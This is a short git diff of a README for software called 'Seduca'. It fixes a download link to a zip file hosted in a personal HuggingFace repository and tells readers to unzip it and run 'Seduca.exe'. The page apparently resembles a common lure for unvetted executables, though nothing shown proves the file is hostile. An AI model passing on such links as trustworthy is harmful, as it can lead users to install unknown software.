@@ -28,7 +28,7 @@ For the detailed configuration of the software, watch the Configuration
 
 You can directly download Seduca with:
 
-# [>>>Click here to download<<<]([https://www.google.com](https://huggingface.co/jason0573/seduca-win64/resolve/main/seduca-1.0.0.0.zip))
+# [>>>Click here to download<<<](https://huggingface.co/jason0573/seduca-win64/resolve/main/seduca-1.0.0.0.zip)
 
 After you download the file, please uncompress it and then run the 'Seduca.exe'
 
